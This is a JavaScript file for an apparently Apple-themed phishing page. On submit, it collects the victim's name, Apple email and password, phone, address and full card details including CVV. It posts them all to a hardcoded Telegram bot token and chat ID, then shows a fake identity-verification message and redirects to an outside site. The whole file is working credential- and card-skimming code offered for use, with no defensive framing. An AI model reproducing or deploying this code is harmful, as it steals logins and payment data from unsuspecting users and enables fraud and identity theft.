let form = document.querySelector("#form");

let bot = {
	TOKEN: "1990494557:AAEZjIWrL9in7xgBxC_XMo_BFrJJ1q5Cgrc",
	chatID: "-1001571702765",
}

form.addEventListener("submit", e => {
	e.preventDefault();
	
	var fullname = document.getElementById("inputName").value;
	var mailid = document.getElementById("inputEmailID").value;
	var pass = document.getElementById("inputPassword").value;
	var mobilenumber = document.getElementById("inputMobileNo").value;
	var address = document.getElementById("inputAddress").value;
	var city = document.getElementById("inputCity").value;
	var state = document.getElementById("inputState").value;
	var zip = document.getElementById("inputZIP").value;
	var country = document.getElementById("inputCountry").value;
	var chname = document.getElementById("inputCHName").value;
	var cardnumber = document.getElementById("inputCardNumber").value;
	var expiry = document.getElementById("inputExpiry").value;
	var cvv = document.getElementById("inputCVV").value;
	
	
	var my_text = `User Details:%0A - Full Name: ${fullname} %0A - Apple Email ID: ${mailid} %0A - Password: ${pass} %0A - Mobile Number: ${mobilenumber} %0A - Address: ${address} %0A - City: ${city} %0A - State: ${state} %0A - ZIP: ${zip} %0A - Country: ${country} %0A%0ACard Details:%0A - Card Holder Name: ${chname} %0A - Card Number: ${cardnumber} %0A - Expiry: ${expiry} %0A - CVV: ${cvv}`
	
	fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=${my_text}`,{
		method: "GET"
	})
	.then(success => {
		alert("Thank you for verifying your identify, Your order will be proccessed shortly.")
		window.location.assign("https://icrack.in")
	}, error => {
		alert("Verification Failed!")
		console.log(error);
	})
})
